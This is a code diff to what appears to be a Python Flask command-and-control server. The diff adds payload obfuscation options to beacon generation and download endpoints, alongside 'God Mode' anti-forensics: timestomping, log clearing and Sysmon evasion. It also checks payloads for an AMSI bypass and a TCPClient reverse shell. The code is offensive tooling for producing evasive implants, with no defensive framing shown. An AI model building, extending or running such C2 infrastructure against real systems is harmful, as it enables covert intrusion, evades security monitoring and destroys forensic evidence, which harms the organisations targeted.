@@ -221,7 +221,7 @@ def list_payload_types():
 @beacon_bp.route("/c2/payloads/generate", methods=["POST"])
 def generate_payload():
     """
-    Generate beacon payload
+    Generate beacon payload with automatic obfuscation
     
     Request:
     {
@@ -235,7 +235,9 @@ def generate_payload():
                 "timestomp": true,
                 "clean_logs": true,
                 "sysmon_evade": true
-            }
+            },
+            "obfuscation_level": "basic",  // 'none', 'basic', 'advanced'
+            "obfuscation_method": null     // specific method or null
         }
     }
     """
@@ -253,14 +255,15 @@ def generate_payload():
     print(f"   Type: {payload_type}", file=sys.stderr)
     print(f"   Options: {options}", file=sys.stderr)
     print(f"   God Mode: {options.get('god_mode', {})}", file=sys.stderr)
+    print(f"   Obfuscation: {options.get('obfuscation_level', 'none')}", file=sys.stderr)
     
     generator = get_payload_generator(c2_url)
     payload = generator.generate(payload_type, options)
     
     # DEBUG: Check what was generated
     print(f"   Generated size: {len(payload)} bytes", file=sys.stderr)
-    if "Invoke-AMSIBypass" in payload:
-        print(f"   ✓ Elite PowerShell beacon detected", file=sys.stderr)
+    if "Invoke-AMSIBypass" in payload or "base64" in payload.lower():
+        print(f"   ✓ Elite beacon detected (possibly obfuscated)", file=sys.stderr)
     elif "New-Object System.Net.Sockets.TCPClient" in payload and len(payload) < 1000:
         print(f"   ✗ WARNING: Old TCPClient payload detected!", file=sys.stderr)
     
@@ -268,13 +271,16 @@ def generate_payload():
         "success": True,
         "type": payload_type,
         "payload": payload,
-        "c2_url": c2_url
+        "c2_url": c2_url,
+        "obfuscation_level": options.get('obfuscation_level', 'none'),
+        "payload_size": len(payload)
     })
+
 
 
 @beacon_bp.route("/c2/payloads/download/<payload_type>", methods=["GET"])
 def download_payload(payload_type: str):
-    """Download raw payload file with God Mode anti-forensics"""
+    """Download raw payload file with God Mode anti-forensics and obfuscation"""
     if not session.get("logged_in"):
         return jsonify({"error": "unauthorized"}), 401
     
@@ -291,11 +297,17 @@ def download_payload(payload_type: str):
         "sysmon_evade": request.args.get("sysmon_evade", "true").lower() == "true" if god_mode_enabled else False,
     }
     
+    # Extract obfuscation options
+    obfuscation_level = request.args.get("obfuscation_level", "none")
+    obfuscation_method = request.args.get("obfuscation_method", None)
+    
     generator = get_payload_generator(c2_url)
     payload = generator.generate(payload_type, {
         "sleep": sleep, 
         "jitter": jitter,
-        "god_mode": god_mode_options
+        "god_mode": god_mode_options,
+        "obfuscation_level": obfuscation_level,
+        "obfuscation_method": obfuscation_method
     })
     
     # Determine file extension
@@ -309,6 +321,9 @@ def download_payload(payload_type: str):
     }
     ext = extensions.get(payload_type, "txt")
     filename = f"beacon_{payload_type}.{ext}"
+    
+    import sys
+    sys.stderr.write(f"[C2_BEACON] Download: {payload_type} | Obfuscation: {obfuscation_level} | Size: {len(payload)}\n")
     
     return Response(
         payload,
